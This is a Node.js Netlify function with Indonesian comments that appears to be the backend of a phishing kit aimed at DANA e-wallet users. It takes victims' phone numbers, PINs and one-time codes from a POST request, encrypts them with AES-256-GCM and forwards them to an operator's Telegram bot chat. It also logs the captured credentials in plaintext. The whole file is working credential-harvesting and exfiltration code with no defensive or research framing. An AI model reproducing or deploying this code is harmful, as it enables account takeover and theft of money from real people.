const axios = require('axios');
const crypto = require('crypto');

// Fungsi untuk enkripsi data
function encrypt(text, key) {
  try {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(key, 'hex'), iv);
    
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const tag = cipher.getAuthTag();
    return iv.toString('hex') + ':' + encrypted + ':' + tag.toString('hex');
  } catch (error) {
    console.error('Encryption error:', error);
    throw new Error('Gagal mengenkripsi data: ' + error.message);
  }
}

// Format pesan untuk Telegram
function formatMessage(type, phone, pin, otp) {
  const cleanPhone = phone.replace(/\D/g, '');
  
  let message = 
    "├• AKUN | DANA E-WALLET\n" +
    "├───────────────────\n" +
    `├• NO HP : ${cleanPhone}\n`;

  if (pin) {
    message += "├───────────────────\n" +
               `├• PIN  : ${pin}\n`;
  }

  if (otp) {
    message += "├───────────────────\n" +
               `├• OTP : ${otp}\n`;
  }

  message += "╰───────────────────";
  return message;
}

// Fungsi utama Netlify
exports.handler = async (event, context) => {
  console.log('Received event:', JSON.stringify(event, null, 2));
  
  // Hanya terima POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method Not Allowed' }),
      headers: { 
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type'
      }
    };
  }

  try {
    // Parse dan validasi request
    let body;
    try {
      body = JSON.parse(event.body);
    } catch (parseError) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Invalid JSON format' }),
        headers: { 
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      };
    }
    
    const { type, phone, pin, otp } = body;
    
    if (!type || !phone) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Type and phone are required' }),
        headers: { 
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      };
    }

    // Bersihkan nomor telepon
    const cleanPhone = phone.replace(/\D/g, '');
    
    if (cleanPhone.length < 10) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Phone number must be at least 10 digits' }),
        headers: { 
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      };
    }

    // Ambil konfigurasi dari environment variables
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    const encryptionKey = process.env.ENCRYPTION_KEY;

    console.log('Environment variables:', {
      hasBotToken: !!botToken,
      hasChatId: !!chatId,
      hasEncryptionKey: !!encryptionKey,
      botTokenLength: botToken ? botToken.length : 0,
      chatId: chatId,
      encryptionKeyLength: encryptionKey ? encryptionKey.length : 0
    });

    // Validasi konfigurasi
    if (!botToken) {
      console.error('Missing TELEGRAM_BOT_TOKEN');
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Telegram bot token not configured' }),
        headers: { 
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      };
    }

    if (!chatId) {
      console.error('Missing TELEGRAM_CHAT_ID');
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Telegram chat ID not configured' }),
        headers: { 
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      };
    }

    if (!encryptionKey) {
      console.error('Missing ENCRYPTION_KEY');
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Encryption key not configured' }),
        headers: { 
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      };
    }

    if (encryptionKey.length !== 64) {
      console.error('Invalid ENCRYPTION_KEY length:', encryptionKey.length);
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Encryption key must be 64 characters' }),
        headers: { 
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      };
    }

    // Format dan enkripsi pesan
    const originalMessage = formatMessage(type, cleanPhone, pin, otp);
    console.log('Original message:', originalMessage);
    
    const encryptedMessage = encrypt(originalMessage, encryptionKey);
    console.log('Encrypted message generated');

    // Kirim pesan terenkripsi ke Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    console.log('Sending to Telegram URL:', telegramUrl);
    
    const telegramData = {
      chat_id: chatId,
      text: `🔐 DATA TERENKRIPSI:\n${encryptedMessage}\n\nGunakan kunci AES-256-GCM untuk mendekripsi.`,
      parse_mode: 'HTML'
    };

    console.log('Telegram request data:', JSON.stringify(telegramData, null, 2));

    const telegramResponse = await axios.post(telegramUrl, telegramData, {
      timeout: 10000,
      headers: {
        'Content-Type': 'application/json'
      }
    }).catch(error => {
      console.error('Telegram API Error:', {
        message: error.message,
        response: error.response?.data,
        status: error.response?.status,
        config: {
          url: error.config?.url,
          data: error.config?.data
        }
      });
      throw error;
    });

    console.log('Telegram response:', {
      status: telegramResponse.status,
      data: telegramResponse.data
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ 
        success: true,
        message: 'Data terenkripsi berhasil dikirim',
        telegram_status: telegramResponse.status
      }),
      headers: { 
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    };

  } catch (error) {
    console.error('Global Error:', {
      message: error.message,
      stack: error.stack,
      code: error.code,
      response: error.response?.data
    });
    
    return {
      statusCode: 500,
      body: JSON.stringify({
        error: 'Internal Server Error',
        details: error.message,
        type: error.name
      }),
      headers: { 
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    };
  }
};
